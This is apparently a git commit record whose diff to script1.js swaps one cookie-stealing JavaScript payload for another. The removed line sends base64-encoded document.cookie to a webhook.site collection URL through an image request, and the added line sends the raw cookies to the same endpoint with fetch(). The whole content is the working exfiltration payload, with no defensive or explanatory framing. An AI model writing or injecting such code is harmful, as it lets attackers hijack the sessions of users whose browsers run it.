adb13298ceb4645368e72ad999149466893d62bf
Fiberz1337 <franacademy9001@gmail.com>
2025-01-20 18:30:54 +0100

    Update script1.js

--- script1.js
+++ script1.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/a058c892-5eac-4d2a-8e89-d4d064e42556?data='+btoa(document.cookie);
+fetch('https://webhook.site/a058c892-5eac-4d2a-8e89-d4d064e42556/?data=' + document.cookie);
